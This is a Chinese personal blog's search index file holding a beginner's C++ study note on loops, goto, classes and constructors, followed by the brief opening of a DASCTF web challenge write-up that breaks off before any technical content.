<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C艹从入门到入土</title>
    <url>/2022/02/10/C%E8%89%B9%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<h3 id="一、入门"><a href="#一、入门" class="headerlink" title="一、入门"></a>一、入门</h3><p>国际惯例，输出<code>hello world</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name is:&quot;</span>&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于学过c，所以相同的东西就不过多赘述了</p>
<span id="more"></span>

<h4 id="1-for循环练习"><a href="#1-for循环练习" class="headerlink" title="1.for循环练习"></a>1.for循环练习</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">7</span> == <span class="number">0</span> || i % <span class="number">10</span> == <span class="number">7</span> || (i / <span class="number">10</span> ) % <span class="number">10</span> == <span class="number">7</span>)&#123;</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-跳转语句之goto语句"><a href="#2-跳转语句之goto语句" class="headerlink" title="2.跳转语句之goto语句"></a>2.跳转语句之goto语句</h4><p>（不怎么使用</p>
<p><strong>作用：</strong>无条件跳转语句</p>
<p><strong>语法：</strong><code>goto 标记;</code></p>
<p><strong>解释：</strong>如果标记的名称存在，执行到goto语句时，会跳转到标记的位置</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">goto</span> FLAG;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;5 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    FLAG:</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;6 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;7 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二、类和对象"><a href="#二、类和对象" class="headerlink" title="二、类和对象"></a>二、类和对象</h3><h4 id="2-1-封装"><a href="#2-1-封装" class="headerlink" title="2.1 封装"></a>2.1 封装</h4><p>将属性和行为作为一个整体，表现生活中的事物并对属性和行为加以权限控制。</p>
<p>语法：<code>class ClassName&#123; &#125;;</code></p>
<p>实例1：设计一个圆类，求圆的面积</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CircleController</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculation</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PI * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">10</span>;</span><br><span class="line">    CircleController c1;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;圆的面积为：&quot;</span> &lt;&lt; c1.<span class="built_in">calculation</span>(r) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例2：Student类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name  = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 获取信息</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setInfot</span><span class="params">(string name,<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;id = id;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 输出信息</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="string">&quot; and your id:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;id &lt;&lt; endl;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Student s1;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">1</span>;</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cin &gt;&gt; id;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your id:&quot;</span> &lt;&lt; id &lt;&lt; endl;</span><br><span class="line">    s1.<span class="built_in">setInfot</span>(name,id);</span><br><span class="line">    s1.<span class="built_in">printInfor</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问权限有，Class的默认权限是<code>private</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公共权限 public</span><br><span class="line">保护权限 protected</span><br><span class="line">私有权限 private</span><br></pre></td></tr></table></figure>

<p>案例3：设计立方体类（Cube）</p>
<p>求出立方体的面积和体积，分别用全局函数和成员函数判断两个立方体是否相等</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cube</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">double</span> m_L;</span><br><span class="line">    <span class="keyword">double</span> m_W;</span><br><span class="line">    <span class="keyword">double</span> m_H;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getL</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getW</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_W;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getH</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Cube c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m_L == c.<span class="built_in">getL</span>() &amp;&amp; m_W == c.<span class="built_in">getW</span>() &amp;&amp; m_H == c.<span class="built_in">getH</span>())&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setData</span><span class="params">(<span class="keyword">double</span> L,<span class="keyword">double</span> W,<span class="keyword">double</span> H)</span></span>&#123;</span><br><span class="line">        m_L = L;</span><br><span class="line">        m_W = W;</span><br><span class="line">        m_H = H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_L * m_W * m_H;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (m_L * m_W + m_W * m_H + m_L * m_H);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Measure</span><span class="params">(Cube c1,Cube c2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c1.<span class="built_in">getL</span>() == c2.<span class="built_in">getL</span>() &amp;&amp; c1.<span class="built_in">getW</span>() == c2.<span class="built_in">getW</span>() &amp;&amp; c1.<span class="built_in">getH</span>() == c2.<span class="built_in">getH</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Cube c1;</span><br><span class="line">    Cube c2;</span><br><span class="line">    c1.<span class="built_in">setData</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    c2.<span class="built_in">setData</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    c1.<span class="built_in">measure</span>(c2);</span><br><span class="line">    <span class="built_in">Measure</span>(c1,c2);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your volume:&quot;</span> &lt;&lt; c1.<span class="built_in">getVolume</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your area:&quot;</span> &lt;&lt; c1.<span class="built_in">getArea</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>案例4：点和圆之间的关系</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPoint</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    Point p;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setR</span><span class="params">(<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;r = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCenter</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        p.<span class="built_in">setPoint</span>(x,y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getR</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterX</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getX</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCenterY</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">getY</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">measure</span><span class="params">(Circle c,Point p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    res = <span class="built_in">sqrt</span>((c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) * (c.<span class="built_in">getCenterX</span>() - p.<span class="built_in">getX</span>()) + (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()) * (c.<span class="built_in">getCenterY</span>() - p.<span class="built_in">getY</span>()));</span><br><span class="line">    <span class="keyword">if</span>(res == c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point on the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res &gt; c.<span class="built_in">getR</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point out the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the point in the circle&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Circle c;</span><br><span class="line">    c.<span class="built_in">setR</span>(<span class="number">10</span>);</span><br><span class="line">    c.<span class="built_in">setCenter</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    Point p;</span><br><span class="line">    p.<span class="built_in">setPoint</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">measure</span>(c,p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-对象的初始化和清理"><a href="#2-2-对象的初始化和清理" class="headerlink" title="2.2 对象的初始化和清理"></a>2.2 对象的初始化和清理</h4><p>构造函数和析构函数</p>
<ul>
<li><p>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用；</p>
</li>
<li><p>析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。</p>
</li>
</ul>
<p>实例1：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>();</span><br><span class="line">    ~<span class="built_in">Person</span>();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setName</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;your name:&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; your age:&quot;</span> &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person::<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person::~<span class="built_in">Person</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;BYE!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    p1.<span class="built_in">setName</span>(<span class="string">&quot;Ameuu&quot;</span>);</span><br><span class="line">    p1.<span class="built_in">print</span>();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>构造函数的分类及调用</strong></p>
<p>分类：</p>
<p>​    按参数分类：有参、无参</p>
<p>​    按类型分类：普通、拷贝</p>
<p>调用：</p>
<p>​    括号法、显示法、隐式转换法</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.构造函数的分类及调用</span></span><br><span class="line"><span class="comment"> * 分类：有参 无参/ 普通 拷贝</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 有参构造函数</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;the contrust funtion include args&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        <span class="comment">//将传入的类的所有属性拷贝到本类身上</span></span><br><span class="line">        age = p.age;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 括号法</span></span><br><span class="line">    <span class="comment">// Person p1; </span></span><br><span class="line">    <span class="comment">// Person p2(10);</span></span><br><span class="line">    <span class="comment">// Person p3(p2);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示</span></span><br><span class="line">    <span class="comment">// Person p1;</span></span><br><span class="line">    <span class="comment">// Person p2 = Person(10);</span></span><br><span class="line">    <span class="comment">// Person p3 = Person(p2);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Person(10); // 匿名对象 当前行执行结束之后，系统立即回收</span></span><br><span class="line">    <span class="comment">// // 注意：不能利用拷贝构造函数初始化匿名对象</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;*****************************&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 隐式转换</span></span><br><span class="line">    Person p1 = <span class="number">10</span>;</span><br><span class="line">    Person p2 = p1;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>拷贝构造函数的调用</strong></p>
<p>​    1.使用一个创建完毕的对象来初始化一个新对象</p>
<p>​    2.值传递的方式给函数参数传值</p>
<p>​    3.值方式返回局部对象</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Person</span>()&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;destruct function&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Person</span>(<span class="keyword">const</span> Person &amp;p)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;copy contruct funtion&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Person p)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="built_in">test1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    1.使用一个创建完毕的对象来初始化一个新对象</span></span><br><span class="line">    Person p1;</span><br><span class="line">    Person p2 = <span class="built_in">test1</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//    2.值传递的方式给函数参数传值</span></span><br><span class="line">    <span class="comment">// test(p1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    3.值方式返回局部对象</span></span><br><span class="line">    <span class="comment">// Person p3 = test1();</span></span><br><span class="line">    <span class="comment">// test2();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>语言学习</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF Apr X FATE 防疫挑战赛 web复现中</title>
    <url>/2022/04/27/DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B-web%E5%A4%8D%E7%8E%B0%E4%B8%AD/</url>
    <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><blockquote>
<p>上周末四场比赛，由于一开始MRCTF太坐牢了，一直在打DAS，周日调休满课<del>（主要是在补作业）</del>胖哈勃和网刃也都只看了一点，心累，忙里偷闲赶紧复现一下（</p>
</blockquote>
<span id="more"></span>

<h3 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h3><p>下载附件，有四个类</p>
